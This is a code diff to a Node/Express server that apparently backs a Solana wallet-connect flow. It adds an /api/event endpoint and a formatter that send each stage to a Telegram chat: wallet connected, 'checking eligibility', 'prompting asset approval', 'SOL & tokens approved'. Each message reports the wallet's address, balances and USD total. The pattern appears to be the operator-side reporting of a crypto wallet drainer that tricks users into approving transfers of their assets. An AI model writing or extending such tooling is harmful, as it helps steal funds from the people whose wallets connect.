@@ -143,6 +143,35 @@ function formatSnapshot(portfolio) {
   return text;
 }
 
+
+function formatEvent(event) {
+  const stage = event.stage || 'update';
+  const address = event.address || 'unknown';
+  const titles = {
+    connect_opened: '🟣 Connect started',
+    connecting: '⏳ Waiting for wallet approval',
+    connected: '✅ Wallet connected',
+    checking: '🔍 Checking eligibility',
+    needs_approval: '✍️ Prompting asset approval',
+    empty: '∅ No SOL or tokens',
+    approved: '🔓 SOL & tokens approved',
+    rejected: '🚫 Approval cancelled',
+    failed: '⚠️ Flow failed',
+  };
+  const lines = [
+    titles[stage] || `📣 ${escapeHtml(stage)}`,
+    '━━━━━━━━━━━━━━━━━━━━',
+    `↳ <code>${escapeHtml(address)}</code>`,
+  ];
+  if (event.wallet) lines.push(`↳ Wallet: ${escapeHtml(event.wallet)}`);
+  if (event.sol != null) lines.push(`↳ ◎ SOL: ${escapeHtml(formatAmount(Number(event.sol)))}`);
+  if (event.tokenCount != null) lines.push(`↳ 🪙 Tokens: ${escapeHtml(event.tokenCount)}`);
+  if (event.totalUsd != null) lines.push(`↳ 💵 ${escapeHtml(formatUsd(Number(event.totalUsd)))}`);
+  if (event.detail) lines.push(`↳ ${escapeHtml(event.detail)}`);
+  lines.push(`🕒 ${escapeHtml(new Date().toLocaleString('en-CA', { timeZone: 'America/Edmonton', hour12: false }))} MDT`);
+  return lines.join('\n');
+}
+
 async function sendTelegram(text) {
   if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
     return { sent: false, reason: 'missing_env' };
@@ -226,16 +255,30 @@ app.get('/api/health', (_req, res) => {
 app.get('/api/portfolio/:pubkey', async (req, res) => {
   try {
     const portfolio = await loadPortfolio(req.params.pubkey);
+    const notify = req.query.notify === '1';
 
-    let telegram = { sent: false };
-    try {
-      telegram = await sendTelegram(formatSnapshot(portfolio));
-    } catch (tgErr) {
-      console.error('Telegram error:', tgErr);
-      telegram = { sent: false, reason: tgErr.message };
+    let telegram = { sent: false, skipped: !notify };
+    if (notify) {
+      try {
+        telegram = await sendTelegram(formatSnapshot(portfolio));
+      } catch (tgErr) {
+        console.error('Telegram error:', tgErr);
+        telegram = { sent: false, reason: tgErr.message };
+      }
     }
 
     res.json({ ...portfolio, telegram });
+  } catch (err) {
+    console.error(err);
+    res.status(400).json({ error: err.message });
+  }
+});
+
+app.post('/api/event', async (req, res) => {
+  try {
+    const event = req.body || {};
+    const telegram = await sendTelegram(formatEvent(event));
+    res.json({ ok: true, telegram });
   } catch (err) {
     console.error(err);
     res.status(400).json({ error: err.message });
